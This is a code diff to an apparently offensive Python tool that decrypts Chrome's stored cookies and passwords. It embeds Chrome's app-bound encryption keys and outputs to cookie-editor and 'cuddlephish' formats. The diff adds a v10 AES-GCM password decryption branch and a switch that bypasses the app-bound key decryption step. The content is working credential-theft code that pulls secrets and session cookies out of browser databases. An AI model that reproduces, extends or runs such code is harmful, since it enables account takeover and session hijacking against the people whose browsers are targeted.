@@ -141,6 +141,13 @@ def decrypt_data(encrypted_junk, key, password=False):
     version = encrypted_junk[:3]
     if version in (b'v10', b'v11'):
         try:
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(key, AES.MODE_GCM, initialisation_vector)
+                decrypted_pass = cipher.decrypt(encrypted_password)
+                decrypted_pass = decrypted_pass.decode()
+                return decrypted_pass
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
                 print("Error: Nonce cannot be empty")
@@ -154,7 +161,7 @@ def decrypt_data(encrypted_junk, key, password=False):
             print("Error: Could not decrypt password")
             print(e)
             return ""
-    if version in (b'v20'):    
+    if version in (b'v20'):
         try:
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
@@ -182,6 +189,7 @@ def argparse_args():
     parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'cuddlephish', 'firefox'], help='Option to choose', required=True)
     parser.add_argument('-f','--file', help='Location of the database file', required=True)
     parser.add_argument('--chrome-aes-key',help='Chrome AES Key',required=False)
+    parser.add_argument('--chrome-v10',action="store_false",help='Chrome v10',required=False)
     return parser.parse_args()
 
 def main():
@@ -191,6 +199,7 @@ def main():
     option = args.option
     file_location = args.file
     chromeAES = args.chrome_aes_key
+    chrome_v10 = args.chrome_v10
     if chromeAES:
         base64ChromeKey = base64.b64encode(chromeAES.encode())
     
@@ -206,30 +215,30 @@ def main():
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         xored_aes_key = byte_xor(chromeKey, xor_key)
 
-
     #print(len(key))
-    if len(key) > 32:
-        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
-        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-        flag = key[0]
-        iv = key[1:1+12]
-        ciphertext = key[1+12:1+12+32]
-        tag = key[1+12+32:]
+    if not chrome_v10:
+        if len(key) > 32:
+            aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+            flag = key[0]
+            iv = key[1:1+12]
+            ciphertext = key[1+12:1+12+32]
+            tag = key[1+12+32:]
 
-        #check for flag to determine if AES or ChaCha. Changed in chrome 130+
-        if flag == 1:
-            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
-        elif flag == 2:
-            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
-        elif flag == 3:
-            iv = key[1+32:1+32+12]
-            ciphertext = key[1+32+12:1+32+12+32]
-            tag = key[1+32+12+32:1+32+12+32+16]
-            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
-        else:
-            raise ValueError(f"Unsupported flag: {flag}")
-        key = cipher.decrypt_and_verify(ciphertext, tag)
-        print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")
+            #check for flag to determine if AES or ChaCha. Changed in chrome 130+
+            if flag == 1:
+                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+            elif flag == 2:
+                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
+            elif flag == 3:
+                iv = key[1+32:1+32+12]
+                ciphertext = key[1+32+12:1+32+12+32]
+                tag = key[1+32+12+32:1+32+12+32+16]
+                cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
+            else:
+                raise ValueError(f"Unsupported flag: {flag}")
+            key = cipher.decrypt_and_verify(ciphertext, tag)
+            print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")
 
     if option == "cookies":
         cookies(key, file_location)
